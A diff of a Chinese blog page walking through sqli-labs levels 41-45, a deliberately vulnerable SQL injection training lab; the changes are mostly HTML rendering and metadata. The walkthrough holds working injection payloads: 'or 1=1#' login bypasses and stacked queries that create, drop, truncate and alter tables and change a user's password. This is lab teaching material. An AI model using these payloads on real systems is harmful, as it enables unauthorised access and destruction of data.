@@ -34,13 +34,13 @@
   <!-- 页面元数据 -->
   <title>sqli-labs-41-45 - Dr4x3zz</title>
   <meta name="keywords" content="sqli-labs,null">
-  <meta desc name="description" content="# sqli-labs-41-45 - Dr4x3zz - Dr4x3zz">
+  <meta desc name="description" content="sqli-labs-41-45 - Dr4x3zz - Dr4x3zz">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs-41-45">
 <meta property="og:url" content="https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/index.html">
 <meta property="og:site_name" content="Dr4x3zz">
-<meta property="og:description" content="# sqli-labs-41-45">
+<meta property="og:description" content="sqli-labs-41-45">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-03-29T08:15:31.000Z">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1728903703248),
+    lastupdate: new Date(1728903825782),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2585,91 +2585,93 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="sqli-labs-41-45"><a class="markdownIt-Anchor" href="#sqli-labs-41-45">#</a> sqli-labs-41-45</h1>
-<span id="more"></span>
-<h2 id="sqli-labs-41"><a class="markdownIt-Anchor" href="#sqli-labs-41">#</a> sqli-labs-41</h2>
-<p>id=1	有查询结果</p>
-<p>id=1’	无查询结果</p>
-<p>id=1&quot;	无查询结果</p>
-<p>id=1 --+	有查询结果</p>
+    <h1 id="sqli-labs-41-45"><a href="#sqli-labs-41-45" class="headerlink" title="sqli-labs-41-45"></a>sqli-labs-41-45</h1><span id="more"></span>
+
+<h2 id="sqli-labs-41"><a href="#sqli-labs-41" class="headerlink" title="sqli-labs-41"></a>sqli-labs-41</h2><p>id&#x3D;1	有查询结果</p>
+<p>id&#x3D;1’	无查询结果</p>
+<p>id&#x3D;1”	无查询结果</p>
+<p>id&#x3D;1 –+	有查询结果</p>
 <p>本关无闭合</p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113611.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113611.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113611.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113611.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>查看源代码确实无闭合</p>
 <p>直接进行堆叠注入</p>
-<p>在 oblivion10 数据库下新建一个 test 表然后再删除</p>
+<p>在oblivion10数据库下新建一个test表然后再删除</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1;use oblivion10;create table test(id int,user varchar(10)); --+</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113612.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113612.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113612.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113612.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>成功创建</p>
 <p>尝试删除</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1;drop table oblivion10.test; --+</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113613.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113613.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>成功删除表 test</p>
-<h2 id="sqli-labs-42"><a class="markdownIt-Anchor" href="#sqli-labs-42">#</a> sqli-labs-42</h2>
-<p>本关为 post 型</p>
-<p>我们登录并且使用 bp 抓包</p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113614.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113614.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>那我们可以通过这个来更改 user admin 的密码，不过登录成功后也可以直接更改我觉得没什么必要更改这个用户的密码了</p>
-<p>所以尝试更改 security 中其他用户的密码</p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113615.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113615.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>尝试更改 user stupid 的密码</p>
-<p>bp 抓包，尝试闭合，发现本关是单引号闭合</p>
+
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113613.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113613.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>成功删除表test</p>
+<h2 id="sqli-labs-42"><a href="#sqli-labs-42" class="headerlink" title="sqli-labs-42"></a>sqli-labs-42</h2><p>本关为post型</p>
+<p>我们登录并且使用bp抓包</p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113614.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113614.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>那我们可以通过这个来更改user admin的密码，不过登录成功后也可以直接更改我觉得没什么必要更改这个用户的密码了</p>
+<p>所以尝试更改security中其他用户的密码</p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113615.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113615.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>尝试更改user stupid的密码</p>
+<p>bp抓包，尝试闭合，发现本关是单引号闭合</p>
 <p>更改密码</p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113616.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113616.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113617.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113617.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113618.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113618.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113616.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113616.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113617.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113617.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113618.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113618.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>成功</p>
-<h2 id="sqli-labs-43"><a class="markdownIt-Anchor" href="#sqli-labs-43">#</a> sqli-labs-43</h2>
-<p><em><strong>PHP mysqli_real_escape_string () 函数</strong></em></p>
+<h2 id="sqli-labs-43"><a href="#sqli-labs-43" class="headerlink" title="sqli-labs-43"></a>sqli-labs-43</h2><p><em><strong>PHP mysqli_real_escape_string() 函数</strong></em></p>
 <p>转义字符串中的特殊字符</p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113619.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113619.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>通过代码知道本关 password 是一个很明显的注入点</p>
-<p>直接用 hackbar 来做这一道题，不过不能直接 load url，要直接提交至目标表单，再 load url 后面添加 login.php</p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113619.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113619.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>通过代码知道本关password是一个很明显的注入点</p>
+<p>直接用hackbar来做这一道题，不过不能直接load url，要直接提交至目标表单，再load url后面添加login.php</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php</span><br></pre></td></tr></table></figure>
-<p>由于我没有重置数据库，我的 admin 用户的 password 为 qwe</p>
+
+<p>由于我没有重置数据库，我的admin用户的password为qwe</p>
 <p>添加单引号尝试闭合</p>
-<p>在 post data 输入</p>
+<p>在post data输入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113620.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113620.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113621.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113621.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113620.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113620.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113621.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113621.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>显而易见闭合为’)</p>
 <p>之后对数据库的各种操作就不说了</p>
-<h2 id="sqli-labs-44"><a class="markdownIt-Anchor" href="#sqli-labs-44">#</a> sqli-labs-44</h2>
-<p>post data</p>
-<p>login_user=admin’&amp;login_password=qwe&amp;mysubmit=Login</p>
-<p>login_user=admin&quot;&amp;login_password=qwe&amp;mysubmit=Login</p>
-<p>login_user=admin&amp;login_password=qwe’&amp;mysubmit=Login</p>
-<p>login_user=admin&amp;login_password=qwe&quot;&amp;mysubmit=Login</p>
+<h2 id="sqli-labs-44"><a href="#sqli-labs-44" class="headerlink" title="sqli-labs-44"></a>sqli-labs-44</h2><p>post data</p>
+<p>login_user&#x3D;admin’&amp;login_password&#x3D;qwe&amp;mysubmit&#x3D;Login</p>
+<p>login_user&#x3D;admin”&amp;login_password&#x3D;qwe&amp;mysubmit&#x3D;Login</p>
+<p>login_user&#x3D;admin&amp;login_password&#x3D;qwe’&amp;mysubmit&#x3D;Login</p>
+<p>login_user&#x3D;admin&amp;login_password&#x3D;qwe”&amp;mysubmit&#x3D;Login</p>
 <p>说明本关不报错</p>
-<p>盲注找闭合的方法其实也很简单，像本关这样两个输入框的正确值都不知道的情况下，在普通找闭合的 payload 中闭合符号之后增加 **or 1=1#** 就行，如果返回的页面显示登录成功，说明闭合成功。</p>
-<p>用 hackbar 向</p>
+<p>盲注找闭合的方法其实也很简单，像本关这样两个输入框的正确值都不知道的情况下，在普通找闭合的payload中闭合符号之后增加 **or 1&#x3D;1#**就行，如果返回的页面显示登录成功，说明闭合成功。</p>
+<p>用hackbar向</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php</span><br></pre></td></tr></table></figure>
-<p>发送如下 payload 检查 username 输入框是否有注入点</p>
-<p>login_user=admin’ or 1=1#&amp;login_password=qwe&amp;mysubmit=Login</p>
-<p>login_user=admin&quot; or 1=1#&amp;login_password=qwe&amp;mysubmit=Login</p>
-<p>页面回显都是下图这样登录失败的页面，username 输入框没找到注入点<br>
-<img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113622.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113622.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>送如下 payload 检查 password 输入框是否有注入点</p>
-<p>login_user=admin&amp;login_password=pass’ or 1=1#&amp;mysubmit=Login</p>
+
+<p>发送如下payload检查username输入框是否有注入点</p>
+<p>login_user&#x3D;admin’ or 1&#x3D;1#&amp;login_password&#x3D;qwe&amp;mysubmit&#x3D;Login</p>
+<p>login_user&#x3D;admin” or 1&#x3D;1#&amp;login_password&#x3D;qwe&amp;mysubmit&#x3D;Login</p>
+<p>页面回显都是下图这样登录失败的页面，username输入框没找到注入点<br><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113622.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113622.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>送如下payload检查password输入框是否有注入点</p>
+<p>login_user&#x3D;admin&amp;login_password&#x3D;pass’ or 1&#x3D;1#&amp;mysubmit&#x3D;Login</p>
 <p>成功</p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113623.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113623.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>剩下的就是堆叠注入了<br>
-这里来使用试下清空表中所有数据的 sql 语句</p>
-<p>先在 oblivion10 数据库中新建几个数据</p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113623.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113623.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>剩下的就是堆叠注入了<br>这里来使用试下清空表中所有数据的sql语句</p>
+<p>先在oblivion10数据库中新建几个数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(1,&#x27;tset2&#x27;)#&amp;mysubmit=Login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(2,&#x27;tset2&#x27;)#&amp;mysubmit=Login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login_user=admin&amp;login_password=qwe&#x27;;insert into oblivion10.test66 values(3,&#x27;tset3&#x27;)#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113624.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113624.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113624.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113624.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>尝试删除</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;;truncate table oblivion10.test66#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113625.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113625.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113625.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113625.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>成功删除</p>
-<h2 id="sqli-labs-45"><a class="markdownIt-Anchor" href="#sqli-labs-45">#</a> sqli-labs-45</h2>
-<p>用 44 关写到的方法</p>
-<p>post data 输入</p>
+<h2 id="sqli-labs-45"><a href="#sqli-labs-45" class="headerlink" title="sqli-labs-45"></a>sqli-labs-45</h2><p>用44关写到的方法</p>
+<p>post data输入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;) or 1=1#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113626.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113626.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p>本关尝试给 oblivion10 数据库中 test66 表新增一列</p>
+
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113626.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113626.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>本关尝试给oblivion10数据库中test66表新增一列</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=qwe&#x27;);alter table oblivion10.test66 add column num int(10)#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113627.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113627.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
-<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113628.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113628.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113627.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113627.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113628.png" class="lazyload" data-srcset="/2023/03/29/sqli-labs-41-45/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_31_113628.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <p>新增成功</p>
 
   </div>
@@ -2721,7 +2723,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/&title=sqli-labs-41-45 - Dr4x3zz&summary=# sqli-labs-41-45"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/&title=sqli-labs-41-45 - Dr4x3zz&summary=sqli-labs-41-45"
           
           >
           
@@ -2733,7 +2735,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/&title=sqli-labs-41-45 - Dr4x3zz&summary=# sqli-labs-41-45"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/&title=sqli-labs-41-45 - Dr4x3zz&summary=sqli-labs-41-45"
           
           >
           
@@ -2745,7 +2747,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/&title=sqli-labs-41-45 - Dr4x3zz&summary=# sqli-labs-41-45"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/&title=sqli-labs-41-45 - Dr4x3zz&summary=sqli-labs-41-45"
           
           >
           
@@ -2780,26 +2782,26 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2023/03/31/sqli-labs-46-53/'>
           <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>sqli-labs-46-53</p>
-          <p class='content'># sqli-labs-46-53
+          <p class='content'>sqli-labs-46-53
 
-# sqli-labs-46
-
+sqli-labs-46
 Please input parameter as SORT with numeric value
-请输入参数作为带有数值的...</p>
+请输入参数作为带有数值的排序
+试用...</p>
         </a>
       
       
